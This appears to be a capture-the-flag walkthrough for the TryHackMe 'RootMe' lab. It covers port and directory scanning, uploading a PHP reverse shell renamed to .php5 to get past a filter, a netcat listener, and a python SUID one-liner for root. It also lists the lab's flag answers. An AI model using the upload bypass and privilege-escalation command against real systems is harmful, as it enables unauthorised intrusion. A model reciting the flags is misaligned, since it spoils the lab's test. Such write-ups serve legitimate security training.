# RootMe


- Deploy the machine

	no answer needed

- Scan the machine, how many ports are open?

	- `nmap <TARGET_IP>`
	- `2`

- What version of Apache are running?

	- `nmap -sV <TARGET_IP>`
	- `2.4.29`

- What service is running on port 22?

	- `ssh`

- Find directories on the web server using the GoBuster tool.

	no answer needed

	- `gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

- What is the hidden directory?

	- `/panel/`

- Find a form to upload and get a reverse shell, and find the flag. user.txt

	- Go to `http://<TARGET_IP>/panel/` with a browser
	- Change the default IP address in reverse-shell.php5 with your IP address. (php5 because php is not allowed.)
	- Upload the reverse-shell.php file.
	- On your machine execute `nc -lvnp 1234`
	- You should get a shell.
	- `find / -name user.txt`
	- `cat /var/www/user.txt`
	- `THM{y0u_g0t_a_sh3ll}`

- Search for files with SUID permission, which file is weird?

	- `find / -user root -perm /4000`
	- `/usr/bin/python`

- Find a form to escalate your privileges.

	no answer needed

- root.txt

	- Go to [gtfobins-python-suid](https://gtfobins.github.io/gtfobins/python/#suid)
	- `/usr/bin/python -c 'import os;os.execl("/bin/sh","sh", "-p")'`
	- `cat /root/root.txt`
	- `THM{********_**********}`





